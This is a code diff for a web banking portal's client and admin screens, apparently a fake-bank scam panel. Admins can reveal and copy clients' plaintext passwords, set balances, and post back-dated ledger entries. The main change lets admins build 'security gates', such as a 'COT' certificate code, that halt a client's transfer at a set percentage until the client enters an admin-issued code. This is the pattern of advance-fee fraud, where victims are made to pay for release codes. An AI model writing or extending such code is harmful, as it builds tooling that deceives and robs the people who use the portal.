+              ? '<span class="inline-block text-[11px] font-semibold px-2 py-0.5 rounded-full bg-[#FEF2F2] text-[#C8102E] border border-red-200">Card Frozen</span>'
+              : '<span class="inline-block text-[11px] font-semibold px-2 py-0.5 rounded-full bg-emerald-50 text-emerald-700 border border-emerald-200">Card Active</span>';
 
-          var cardBadge = c.card_frozen
-            ? '<span class="inline-block text-[11px] font-semibold px-2 py-0.5 rounded-full bg-[#FEF2F2] text-[#C8102E] border border-red-200">Card Frozen</span>'
-            : '<span class="inline-block text-[11px] font-semibold px-2 py-0.5 rounded-full bg-emerald-50 text-emerald-700 border border-emerald-200">Card Active</span>';
-
-          return (
-            '<tr class="hover:bg-slate-50/80 transition-colors">' +
-              '<td class="py-3.5 px-5">' +
-                '<div class="flex items-center gap-3">' +
-                  avatarHtml +
-                  '<div>' +
-                    '<div class="font-semibold text-sm text-slate-900">' + escapeHtml(c.full_name) + "</div>" +
-                    '<div class="font-mono text-xs text-slate-500">Acct ' + escapeHtml(Core.formatAccountNumber(c.account_number, false)) + "</div>" +
+            return (
+              '<tr class="hover:bg-slate-50/80 transition-colors">' +
+                '<td class="py-3.5 pl-4 pr-2.5">' +
+                  '<div class="flex items-center gap-2.5">' +
+                    avatarHtml +
+                    '<div>' +
+                      '<div class="font-semibold text-xs sm:text-sm text-slate-900">' + escapeHtml(c.full_name) + "</div>" +
+                      '<div class="font-mono text-[11px] text-slate-500 whitespace-nowrap">Acct ' + escapeHtml(Core.formatAccountNumber(c.account_number, false)) + "</div>" +
+                    "</div>" +
                   "</div>" +
-                "</div>" +
-              "</td>" +
-              '<td class="py-3.5 px-4 text-xs">' +
-                '<div class="font-mono font-semibold text-slate-800">' + escapeHtml(c.username) + "</div>" +
-                '<div class="flex items-center gap-1.5 mt-1">' +
-                  '<span class="font-mono text-slate-600">' + escapeHtml(passDisplay) + "</span>" +
-                  '<button type="button" data-admin-action="toggle-pass" data-client-id="' + escapeHtml(c.id) + '" class="text-[11px] font-semibold text-[#C8102E] hover:underline">' + (isRevealed ? "Hide" : "Reveal") + "</button>" +
-                  '<button type="button" data-admin-action="copy-pass" data-client-id="' + escapeHtml(c.id) + '" class="text-[11px] font-semibold text-slate-500 hover:text-slate-900">Copy</button>' +
-                "</div>" +
-              "</td>" +
-              '<td class="py-3.5 px-4 text-xs text-slate-600">' +
-                '<div class="text-slate-800 font-medium">' + escapeHtml(c.email) + "</div>" +
-                "<div>" + escapeHtml(c.phone) + "</div>" +
-                '<div class="text-[11px] text-slate-400 truncate max-w-[180px]">' + escapeHtml(c.address) + "</div>" +
-              "</td>" +
-              '<td class="py-3.5 px-4 text-xs space-y-1">' +
-                '<div class="font-medium text-slate-800">' + escapeHtml(c.account_tier) + "</div>" +
-                cardBadge +
-              "</td>" +
-              '<td class="py-3.5 px-4 text-right font-mono font-bold text-sm text-slate-900 tabular-nums whitespace-nowrap">' +
-                escapeHtml(Core.formatCurrency(c.balance_usd, "USD")) +
-              "</td>" +
-              '<td class="py-3.5 px-5 text-right whitespace-nowrap">' +
-                '<div class="inline-flex items-center gap-1.5">' +
-                  '<button type="button" data-admin-action="adjust" data-client-id="' + escapeHtml(c.id) + '" class="px-3 py-1.5 rounded-full border border-slate-300 hover:bg-slate-50 text-xs font-semibold text-slate-700">Adjust Balance</button>' +
-                  '<button type="button" data-admin-action="inspect" data-client-id="' + escapeHtml(c.id) + '" class="px-3 py-1.5 rounded-full bg-[#FEF2F2] hover:bg-red-100 text-xs font-semibold text-[#C8102E]">Inspect</button>' +
-                  '<button type="button" data-admin-action="delete" data-client-id="' + escapeHtml(c.id) + '" class="px-3 py-1.5 rounded-full border border-red-200 hover:bg-[#C8102E] hover:text-white text-xs font-semibold text-[#C8102E] transition-colors">Delete</button>' +
-                "</div>" +
-              "</td>" +
-            "</tr>"
-          );
-        }).join("");
-        refreshIcons();
+                "</td>" +
+                '<td class="py-3.5 px-2.5 text-xs">' +
+                  '<div class="font-mono font-semibold text-slate-800">' + escapeHtml(c.username) + "</div>" +
+                  '<div class="flex items-center gap-1.5 mt-1">' +
+                    '<span class="font-mono text-slate-600">' + escapeHtml(passDisplay) + "</span>" +
+                    '<button type="button" data-admin-action="toggle-pass" data-client-id="' + escapeHtml(c.id) + '" class="text-[11px] font-semibold text-[#C8102E] hover:underline">' + (isRevealed ? "Hide" : "Reveal") + "</button>" +
+                    '<button type="button" data-admin-action="copy-pass" data-client-id="' + escapeHtml(c.id) + '" class="text-[11px] font-semibold text-slate-500 hover:text-slate-900">Copy</button>' +
+                  "</div>" +
+                "</td>" +
+                '<td class="py-3.5 px-2.5 text-xs text-slate-600">' +
+                  '<div class="text-slate-800 font-medium truncate max-w-[165px]">' + escapeHtml(c.email) + "</div>" +
+                  '<div class="whitespace-nowrap">' + escapeHtml(c.phone) + "</div>" +
+                  '<div class="text-[11px] text-slate-400 truncate max-w-[155px]">' + escapeHtml(c.address) + "</div>" +
+                "</td>" +
+                '<td class="py-3.5 px-2.5 text-xs space-y-1">' +
+                  '<div class="font-medium text-slate-800 whitespace-nowrap">' + escapeHtml(c.account_tier) + "</div>" +
+                  cardBadge +
+                "</td>" +
+                '<td class="py-3.5 px-2.5 text-right font-mono font-bold text-xs sm:text-sm text-slate-900 tabular-nums whitespace-nowrap">' +
+                  escapeHtml(Core.formatCurrency(c.balance_usd, "USD")) +
+                "</td>" +
+                '<td class="py-3.5 pl-2.5 pr-4 text-right">' +
+                  '<div class="flex flex-wrap justify-end items-center gap-1">' +
+                    '<button type="button" data-admin-action="adjust" data-client-id="' + escapeHtml(c.id) + '" class="px-2.5 py-1 rounded-full border border-slate-300 hover:bg-slate-50 text-[11px] font-semibold text-slate-700 whitespace-nowrap">Adjust Balance</button>' +
+                    '<button type="button" data-admin-action="inspect" data-client-id="' + escapeHtml(c.id) + '" class="px-2.5 py-1 rounded-full bg-[#FEF2F2] hover:bg-red-100 text-[11px] font-semibold text-[#C8102E] whitespace-nowrap">Inspect</button>' +
+                    '<button type="button" data-admin-action="delete" data-client-id="' + escapeHtml(c.id) + '" class="px-2.5 py-1 rounded-full border border-red-200 hover:bg-[#C8102E] hover:text-white text-[11px] font-semibold text-[#C8102E] transition-colors whitespace-nowrap">Delete</button>' +
+                  "</div>" +
+                "</td>" +
+              "</tr>"
+            );
+          }).join("");
+        }
+
+        renderAdminLedgerPanel();
+        renderAdminLoansPanel();
+        renderAdminGatesPanel();
+        renderAdminSmtpPanel();
+        renderAdminSecurityPanel();
+        setActiveAdminTab(appState.adminTab);
       }
 
       // Transfer Modal Helpers
@@ -2676,19 +3724,23 @@
         document.getElementById("transferStep3").classList.toggle("hidden", stepNum !== 3);
       }
 
-      function updateStageBadges(activeStage) {
-        var ids = ["stageBadge1", "stageBadge2", "stageBadge3", "stageBadge4"];
-        ids.forEach(function (id, idx) {
-          var el = document.getElementById(id);
-          var stage = idx + 1;
-          if (stage < activeStage) {
-            el.className = "rounded-lg py-2 px-1 bg-emerald-50 text-emerald-700 font-semibold";
-          } else if (stage === activeStage) {
-            el.className = "rounded-lg py-2 px-1 bg-[#FEF2F2] text-[#C8102E] font-semibold ring-1 ring-[#C8102E]/30";
+      function renderDynamicStageBadges(activeStageIndex) {
+        var container = document.getElementById("dynamicStageBadges");
+        var stages = ["Compliance"].concat(
+          (appState.activeTransferGates || []).map(function (g) { return g.label; }),
+          ["Settled"]
+        );
+        container.innerHTML = stages.map(function (label, idx) {
+          var cls = "flex-1 min-w-[90px] rounded-lg py-2 px-2 ";
+          if (idx < activeStageIndex) {
+            cls += "bg-emerald-50 text-emerald-700 font-semibold";
+          } else if (idx === activeStageIndex) {
+            cls += "bg-[#FEF2F2] text-[#C8102E] font-semibold ring-1 ring-[#C8102E]/30";
           } else {
-            el.className = "rounded-lg py-2 px-1 bg-slate-100 text-slate-500";
+            cls += "bg-slate-100 text-slate-500";
           }
-        });
+          return '<div class="' + cls + '">' + (idx + 1) + ". " + escapeHtml(label) + "</div>";
+        }).join("");
       }
 
       function setProgress(pct, statusText) {
@@ -2705,12 +3757,9 @@
         var client = getCurrentClient();
         document.getElementById("transferDetailsForm").reset();
         document.getElementById("step1Error").classList.add("hidden");
-        document.getElementById("cotInput").value = "";
-        document.getElementById("cotError").classList.add("hidden");
-        document.getElementById("pinInput").value = "";
-        document.getElementById("pinError").classList.add("hidden");
-        document.getElementById("cotGatePanel").classList.add("hidden");
-        document.getElementById("pinGatePanel").classList.add("hidden");
+        document.getElementById("dynamicGateInput").value = "";
+        document.getElementById("dynamicGateError").classList.add("hidden");
+        document.getElementById("dynamicGatePanel").classList.add("hidden");
         document.getElementById("txAvailableHint").textContent = "Avail: " + Core.formatCurrency(client.balance_usd, "USD");
         document.getElementById("txSenderBalanceHint").textContent = "Available: " + Core.formatCurrency(client.balance_usd, "USD");
         setActiveRail("ACH Transfer");
@@ -2727,29 +3776,64 @@
         transferModal.classList.add("hidden");
       }
 
+      function advanceTransferGateStep() {
+        var draft = appState.transferDraft;
+        var gates = appState.activeTransferGates || [];
+        var idx = appState.currentGateIndex;
+
+        if (idx < gates.length) {
+          var gate = gates[idx];
+          var pct = gate.stopAtPercent || 50;
+          setProgress(pct, "Paused at " + pct + "% — " + gate.label + " required for " + draft.rail);
+          renderDynamicStageBadges(idx + 1);
+
+          var inputEl = document.getElementById("dynamicGateInput");
+          var panelEl = document.getElementById("dynamicGatePanel");
+          var isPin = gate.inputType === "pin";
+
+          document.getElementById("dynamicGateTitle").textContent = gate.label + " (" + pct + "%)";
+          document.getElementById("dynamicGateDescription").textContent = gate.description;
+          inputEl.value = "";
+          inputEl.type = isPin ? "password" : "text";
+          inputEl.setAttribute("inputmode", isPin ? "numeric" : "text");
+          inputEl.placeholder = "Enter " + gate.label;
+          inputEl.className = "flex-1 rounded-xl border border-slate-300 bg-white px-3.5 py-2.5 text-sm font-mono" + (isPin ? "" : " uppercase");
+          document.getElementById("dynamicGateSubmitBtn").textContent = idx === gates.length - 1 ? "Authorize Release" : "Verify & Continue";
+          document.getElementById("dynamicGateError").classList.add("hidden");
+
+          panelEl.className = isPin
+            ? "rounded-2xl border border-red-200 bg-[#FEF2F2] p-5"
+            : "rounded-2xl border border-amber-200 bg-amber-50/60 p-5";
+          panelEl.classList.remove("hidden");
+          inputEl.focus();
+        } else {
+          document.getElementById("dynamicGatePanel").classList.add("hidden");
+          renderDynamicStageBadges(gates.length + 1);
+          setProgress(100, "All security gates verified — Settling funds and posting to ledger...");
+          appState.progressTimer = setTimeout(function () {
+            finalizeTransferSettlement();
+          }, 450);
+        }
+      }
+
       function startGateProgressWorkflow() {
         var draft = appState.transferDraft;
+        var gates = ((appState.portalSettings && appState.portalSettings.transfer_gates) || []).slice();
+        appState.activeTransferGates = gates;
+        appState.currentGateIndex = 0;
+
         setTransferStep(2);
         document.getElementById("step2Headline").textContent = "Transfer to " + draft.bankName;
         document.getElementById("step2AmountBadge").textContent = Core.formatCurrency(draft.amount, "USD");
         document.getElementById("step2RailBadge").textContent = draft.rail;
-        document.getElementById("cotGatePanel").classList.add("hidden");
-        document.getElementById("pinGatePanel").classList.add("hidden");
-        document.getElementById("cotInput").value = "";
-        document.getElementById("pinInput").value = "";
-        document.getElementById("cotError").classList.add("hidden");
-        document.getElementById("pinError").classList.add("hidden");
-        updateStageBadges(1);
+        document.getElementById("dynamicGatePanel").classList.add("hidden");
+        document.getElementById("dynamicGateError").classList.add("hidden");
+        renderDynamicStageBadges(0);
         setProgress(15, "Initializing compliance & counterparty verification...");
 
         appState.progressTimer = setTimeout(function () {
-          setProgress(45, "Paused at 45% — COT Verification required for " + draft.rail);
-          updateStageBadges(2);
-          document.getElementById("cotPromptTitle").textContent = "COT Verification Required for " + draft.rail + " (45%)";
-          document.getElementById("cotPromptSubtitle").textContent = "Enter the Certificate of Transfer (COT) code authorized for this " + draft.rail + " disbursement.";
-          document.getElementById("cotGatePanel").classList.remove("hidden");
-          document.getElementById("cotInput").focus();
-        }, 450);
+          advanceTransferGateStep();
+        }, 420);
       }
 
       async function finalizeTransferSettlement() {
@@ -2821,7 +3905,7 @@
           var saveChk = document.getElementById("saveUsernameCheckbox").checked;
           var errEl = document.getElementById("loginError");
 
-          var authResult = Core.authenticatePortal(username, password, appState.clients);
+          var authResult = Core.authenticatePortal(username, password, appState.clients, appState.portalSettings);
           if (!authResult.ok) {
             errEl.textContent = authResult.error;
             errEl.classList.remove("hidden");
@@ -2894,6 +3978,41 @@
             renderClientAvatar(updated);
             showToast("Profile avatar updated and synced.");
           });
+        });
+
+        // Client Self-Service Profile & Settings Modal
+        document.getElementById("openClientProfileBtn").addEventListener("click", openClientProfileModal);
+        document.getElementById("closeClientProfileBtn").addEventListener("click", closeClientProfileModal);
+        document.getElementById("cancelClientProfileBtn").addEventListener("click", closeClientProfileModal);
+        document.getElementById("profileModalPhotoInput").addEventListener("change", function () {
+          var file = this.files && this.files[0];
+          if (!file) return;
+          compressImageFile(file, 240, function (compressedDataUrl) {
+            appState.pendingProfileAvatar = compressedDataUrl;
+            renderProfileModalAvatar(compressedDataUrl, document.getElementById("profileFullNameInput").value);
+          });
+        });
+        document.getElementById("clientProfileForm").addEventListener("submit", async function (e) {
+          e.preventDefault();
+          var client = getCurrentClient();
+          var errEl = document.getElementById("profileModalError");
+          var res = Core.updateClientProfileRecord(client, {
+            full_name: document.getElementById("profileFullNameInput").value,
+            email: document.getElementById("profileEmailInput").value,
+            phone: document.getElementById("profilePhoneInput").value,
+            address: document.getElementById("profileAddressInput").value,
+            avatar_url: appState.pendingProfileAvatar,
+          });
+          if (!res.ok) {
+            errEl.textContent = res.error;
+            errEl.classList.remove("hidden");
+            return;
+          }
+          errEl.classList.add("hidden");
+          await persistClientRecord(res.client);
+          closeClientProfileModal();
+          renderClientDashboard();
+          showToast("Profile & contact settings saved.");
         });
 
         // Currency Switcher
@@ -3044,43 +4163,35 @@
           startGateProgressWorkflow();
         });
 
-        document.getElementById("cotForm").addEventListener("submit", function (e) {
+        document.getElementById("dynamicGateForm").addEventListener("submit", function (e) {
           e.preventDefault();
-          var code = document.getElementById("cotInput").value;
-          var errEl = document.getElementById("cotError");
-          if (!Core.validateCotCode(code)) {
-            errEl.textContent = "Invalid COT authorization code. Please verify and try again.";
+          var gates = appState.activeTransferGates || [];
+          var gate = gates[appState.currentGateIndex];
+          var errEl = document.getElementById("dynamicGateError");
+          if (!gate) {
+            advanceTransferGateStep();
+            return;
+          }
+          var answer = document.getElementById("dynamicGateInput").value;
+          if (!Core.validateGateInput(gate, answer)) {
+            errEl.textContent = "Invalid " + gate.label + ". Please verify and try again.";
             errEl.classList.remove("hidden");
             return;
           }
           errEl.classList.add("hidden");
-          document.getElementById("cotGatePanel").classList.add("hidden");
-          setProgress(75, "COT Verified — Account Security PIN required to authorize settlement...");
-          updateStageBadges(3);
+          document.getElementById("dynamicGatePanel").classList.add("hidden");
+          appState.currentGateIndex += 1;
 
-          appState.progressTimer = setTimeout(function () {
-            document.getElementById("pinGatePanel").classList.remove("hidden");
-            document.getElementById("pinInput").focus();
-          }, 450);
-        });
-
-        document.getElementById("pinForm").addEventListener("submit", function (e) {
-          e.preventDefault();
-          var pin = document.getElementById("pinInput").value;
-          var errEl = document.getElementById("pinError");
-          if (!Core.validateSecurityPin(pin)) {
-            errEl.textContent = "Incorrect Security PIN. Please verify and try again.";
-            errEl.classList.remove("hidden");
-            return;
+          var nextGate = gates[appState.currentGateIndex];
+          if (nextGate) {
+            setProgress(nextGate.stopAtPercent, gate.label + " verified — Proceeding to " + nextGate.label + "...");
+          } else {
+            setProgress(95, gate.label + " verified — Preparing final settlement...");
           }
-          errEl.classList.add("hidden");
-          document.getElementById("pinGatePanel").classList.add("hidden");
-          updateStageBadges(4);
-          setProgress(100, "Security PIN verified — Settling funds and posting to ledger...");
 
           appState.progressTimer = setTimeout(function () {
-            finalizeTransferSettlement();
-          }, 480);
+            advanceTransferGateStep();
+          }, 420);
         });
 
         document.getElementById("copyReceiptBtn").addEventListener("click", function () {
@@ -3102,10 +4213,17 @@
         document.getElementById("newTransferFromReceiptBtn").addEventListener("click", openTransferModal);
 
         // MASTER ADMIN COMMAND CENTER HANDLERS
+        document.querySelectorAll(".admin-nav-btn").forEach(function (btn) {
+          btn.addEventListener("click", function () {
+            setActiveAdminTab(this.getAttribute("data-admin-tab"));
+          });
+        });
+
         document.getElementById("adminSyncCloudBtn").addEventListener("click", async function () {
           await loadClientsRepository();
+          await loadPortalSettings();
           renderAdminDashboard();
-          showToast(appState.cloudConnected ? "Cloud directory synced from Supabase." : "Directory refreshed from local storage.");
+          showToast(appState.cloudConnected ? "Cloud directory & settings synced from Supabase." : "Directory refreshed from local storage.");
         });
 
         document.getElementById("generatePassBtn").addEventListener("click", function () {
@@ -3269,6 +4387,264 @@
           }
         });
 
+        // TAB 2: Credit & Debit Ledger Manager
+        document.getElementById("ledgerAdminClientSelect").addEventListener("change", function () {
+          appState.adminLedgerClientId = this.value;
+          renderAdminLedgerPanel();
+        });
+
+        document.getElementById("adminLedgerForm").addEventListener("submit", async function (e) {
+          e.preventDefault();
+          var client = appState.clients.find(function (c) { return c.id === document.getElementById("ledgerAdminClientSelect").value; });
+          var errEl = document.getElementById("adminLedgerError");
+          var res = Core.applyClientLedgerEntry(client, {
+            type: document.getElementById("ledgerAdminTypeSelect").value,
+            amountUSD: document.getElementById("ledgerAdminAmountInput").value,
+            description: document.getElementById("ledgerAdminDescInput").value,
+            category: document.getElementById("ledgerAdminCategorySelect").value,
+            date: document.getElementById("ledgerAdminDateInput").value,
+          });
+          if (!res.ok) {
+            errEl.textContent = res.error;
+            errEl.classList.remove("hidden");
+            return;
+          }
+          errEl.classList.add("hidden");
+          await persistClientRecord(res.client);
+          document.getElementById("ledgerAdminAmountInput").value = "";
+          document.getElementById("ledgerAdminDescInput").value = "";
+          renderAdminDashboard();
+          showToast("Ledger entry posted for " + res.client.full_name + ".");
+        });
+
+        // TAB 3: Loans & Investments Manager
+        document.getElementById("loansAdminClientSelect").addEventListener("change", function () {
+          appState.adminLoansClientId = this.value;
+          document.getElementById("adminLoansError").classList.add("hidden");
+          renderAdminLoansPanel();
+        });
+
+        document.getElementById("adminLoansInvestmentsForm").addEventListener("submit", async function (e) {
+          e.preventDefault();
+          var client = appState.clients.find(function (c) { return c.id === document.getElementById("loansAdminClientSelect").value; });
+          var errEl = document.getElementById("adminLoansError");
+          var res = Core.applyLoansInvestmentsUpdate(client, {
+            loan_usd: document.getElementById("adminLoanBalanceInput").value,
+            loan_apr: document.getElementById("adminLoanAprInput").value,
+            loan_next_payment: document.getElementById("adminLoanPaymentDateInput").value,
+            investment_usd: document.getElementById("adminInvestmentInput").value,
+            investment_ytd: document.getElementById("adminInvestmentYtdInput").value,
+          });
+          if (!res.ok) {
+            errEl.textContent = res.error;
+            errEl.classList.remove("hidden");
+            return;
+          }
+          errEl.classList.add("hidden");
+          await persistClientRecord(res.client);
+          renderAdminDashboard();
+          showToast("Loans & investments updated for " + res.client.full_name + ".");
+        });
+
+        async function runQuickLoanInvestmentAction(actionType, successMsg) {
+          var client = appState.clients.find(function (c) { return c.id === document.getElementById("loansAdminClientSelect").value; });
+          var errEl = document.getElementById("adminLoansError");
+          var amount = document.getElementById("loansQuickAmountInput").value;
+          var res = Core.applyQuickLoanInvestmentAction(client, actionType, amount);
+          if (!res.ok) {
+            errEl.textContent = res.error;
+            errEl.classList.remove("hidden");
+            return;
+          }
+          errEl.classList.add("hidden");
+          await persistClientRecord(res.client);
+          document.getElementById("loansQuickAmountInput").value = "";
+          renderAdminDashboard();
+          showToast(successMsg + " (" + res.client.full_name + ")");
+        }
+        document.getElementById("quickIssueLoanBtn").addEventListener("click", function () {
+          runQuickLoanInvestmentAction("issue_loan", "Loan facility issued");
+        });
+        document.getElementById("quickRepayLoanBtn").addEventListener("click", function () {
+          runQuickLoanInvestmentAction("repay_loan", "Loan repayment recorded");
+        });
+        document.getElementById("quickAllocateInvestBtn").addEventListener("click", function () {
+          runQuickLoanInvestmentAction("allocate_investment", "Investment funds allocated");
+        });
+
+        // TAB 4: Transfer Security Gates Builder
+        function resetGateBuilderForm() {
+          appState.editingGateId = null;
+          document.getElementById("gateBuilderForm").reset();
+          document.getElementById("gateFormHeading").textContent = "Add Security Verification Gate";
+          document.getElementById("gateSubmitBtn").innerHTML = '<i data-lucide="plus" class="w-4 h-4"></i><span>Add Security Gate</span>';
+          document.getElementById("cancelGateEditBtn").classList.add("hidden");
+          document.getElementById("gateBuilderError").classList.add("hidden");
+          refreshIcons();
+        }
+
+        document.getElementById("cancelGateEditBtn").addEventListener("click", resetGateBuilderForm);
+
+        document.getElementById("gateBuilderForm").addEventListener("submit", async function (e) {
+          e.preventDefault();
+          var label = document.getElementById("gateLabelInput").value.trim();
+          var code = document.getElementById("gateCodeInput").value.trim();
+          var inputType = document.getElementById("gateTypeSelect").value;
+          var desc = document.getElementById("gateDescInput").value.trim();
+          var errEl = document.getElementById("gateBuilderError");
+
+          if (!label || !code || !desc) {
+            errEl.textContent = "Please complete the gate title, verification code, and prompt instruction message.";
+            errEl.classList.remove("hidden");
+            return;
+          }
+          errEl.classList.add("hidden");
+
+          var currentGates = (appState.portalSettings.transfer_gates || []).slice();
+          if (appState.editingGateId) {
+            currentGates = currentGates.map(function (g) {
+              if (g.id !== appState.editingGateId) return g;
+              return Object.assign({}, g, { label: label, code: code, inputType: inputType, description: desc });
+            });
+          } else {
+            currentGates.push({
+              id: "gate_" + Date.now(),
+              label: label,
+              code: code,
+              inputType: inputType,
+              stopAtPercent: 50,
+              description: desc,
+            });
+          }
+
+          var nextSettings = Object.assign({}, appState.portalSettings, {
+            transfer_gates: Core.rebalanceTransferGates(currentGates),
+          });
+          await persistPortalSettings(nextSettings);
+          var wasEditing = Boolean(appState.editingGateId);
+          resetGateBuilderForm();
+          renderAdminGatesPanel();
+          showToast(wasEditing ? "Security gate updated." : "New security gate added to transfer sequence.");
+        });
+
+        document.getElementById("gatesListContainer").addEventListener("click", async function (e) {
+          var btn = e.target.closest("button[data-gate-action]");
+          if (!btn) return;
+          var action = btn.getAttribute("data-gate-action");
+          var gateId = btn.getAttribute("data-gate-id");
+          var gates = (appState.portalSettings.transfer_gates || []).slice();
+          var idx = gates.findIndex(function (g) { return g.id === gateId; });
+          if (idx < 0) return;
+
+          if (action === "edit") {
+            var target = gates[idx];
+            appState.editingGateId = target.id;
+            document.getElementById("gateLabelInput").value = target.label;
+            document.getElementById("gateCodeInput").value = target.code;
+            document.getElementById("gateTypeSelect").value = target.inputType || "text";
+            document.getElementById("gateDescInput").value = target.description;
+            document.getElementById("gateFormHeading").textContent = "Edit Gate: " + target.label;
+            document.getElementById("gateSubmitBtn").textContent = "Save Gate Changes";
+            document.getElementById("cancelGateEditBtn").classList.remove("hidden");
+            document.getElementById("gateLabelInput").focus();
+            return;
+          }
+
+          if (action === "up" && idx > 0) {
+            var prev = gates[idx - 1];
+            gates[idx - 1] = gates[idx];
+            gates[idx] = prev;
+          } else if (action === "down" && idx < gates.length - 1) {
+            var next = gates[idx + 1];
+            gates[idx + 1] = gates[idx];
+            gates[idx] = next;
+          } else if (action === "remove") {
+            gates.splice(idx, 1);
+            if (appState.editingGateId === gateId) resetGateBuilderForm();
+          } else {
+            return;
+          }
+
+          await persistPortalSettings(Object.assign({}, appState.portalSettings, {
+            transfer_gates: Core.rebalanceTransferGates(gates),
+          }));
+          renderAdminGatesPanel();
+          showToast("Transfer gate sequence updated.");
+        });
+
+        // TAB 5: Email SMTP Settings
+        document.getElementById("toggleSmtpPassBtn").addEventListener("click", function () {
+          var input = document.getElementById("smtpPasswordInput");
+          var show = input.type === "password";
+          input.type = show ? "text" : "password";
+          this.textContent = show ? "Hide" : "Show";
+        });
+
+        function collectSmtpFormValues() {
+          return {
+            host: document.getElementById("smtpHostInput").value.trim(),
+            port: Number(document.getElementById("smtpPortInput").value) || 587,
+            encryption: document.getElementById("smtpEncryptionSelect").value,
+            username: document.getElementById("smtpUsernameInput").value.trim(),
+            password: document.getElementById("smtpPasswordInput").value,
+            sender_name: document.getElementById("smtpSenderNameInput").value.trim(),
+            sender_email: document.getElementById("smtpSenderEmailInput").value.trim(),
+            enabled: document.getElementById("smtpEnabledToggle").checked,
+          };
+        }
+
+        function showBanner(elId, isError, text) {
+          var el = document.getElementById(elId);
+          el.textContent = text;
+          el.className = isError
+            ? "rounded-xl border border-red-200 bg-[#FEF2F2] text-[#8B0015] px-4 py-3 text-xs font-medium"
+            : "rounded-xl border border-emerald-200 bg-emerald-50 text-emerald-800 px-4 py-3 text-xs font-medium";
+          el.classList.remove("hidden");
+        }
+
+        document.getElementById("adminSmtpForm").addEventListener("submit", async function (e) {
+          e.preventDefault();
+          var smtp = collectSmtpFormValues();
+          await persistPortalSettings(Object.assign({}, appState.portalSettings, { smtp_config: smtp }));
+          showBanner("smtpStatusBanner", false, "SMTP configuration saved and synchronized across devices.");
+          showToast("SMTP settings saved.");
+        });
+
+        document.getElementById("sendTestSmtpBtn").addEventListener("click", function () {
+          var smtp = collectSmtpFormValues();
+          if (!smtp.host || !smtp.sender_email) {
+            showBanner("smtpStatusBanner", true, "Enter an SMTP Host and Sender Email Address before running a test notification.");
+            return;
+          }
+          showBanner(
+            "smtpStatusBanner",
+            false,
+            "Notification payload verified for " + smtp.sender_name + " <" + smtp.sender_email + "> via " + smtp.host + ":" + smtp.port + " (" + smtp.encryption + ")."
+          );
+          showToast("Test notification payload verified.");
+        });
+
+        // TAB 6: Admin Security
+        document.getElementById("adminSecurityForm").addEventListener("submit", async function (e) {
+          e.preventDefault();
+          var res = Core.updateAdminCredentials(appState.portalSettings, {
+            newUsername: document.getElementById("adminNewUsernameInput").value,
+            currentPassword: document.getElementById("adminCurrentPasswordInput").value,
+            newPassword: document.getElementById("adminNewPasswordInput").value,
+            confirmPassword: document.getElementById("adminConfirmPasswordInput").value,
+          });
+          if (!res.ok) {
+            showBanner("adminSecurityStatus", true, res.error);
+            return;
+          }
+          await persistPortalSettings(res.settings);
+          document.getElementById("adminCurrentPasswordInput").value = "";
+          document.getElementById("adminNewPasswordInput").value = "";
+          document.getElementById("adminConfirmPasswordInput").value = "";
+          showBanner("adminSecurityStatus", false, "Master Admin credentials updated and synchronized.");
+          showToast("Admin credentials updated.");
+        });
+
         // Global Escape closes active modal
         document.addEventListener("keydown", function (e) {
           if (e.key === "Escape") {
@@ -3276,12 +4652,14 @@
             if (!transferModal.classList.contains("hidden")) closeTransferModal();
             if (!adminBalanceModal.classList.contains("hidden")) closeAdjustModal();
             if (!adminDeleteModal.classList.contains("hidden")) closeDeleteModal();
+            if (!clientProfileModal.classList.contains("hidden")) closeClientProfileModal();
           }
         });
       }
 
       async function init() {
         await loadClientsRepository();
+        await loadPortalSettings();
         bindEvents();
 
         var restored = null;
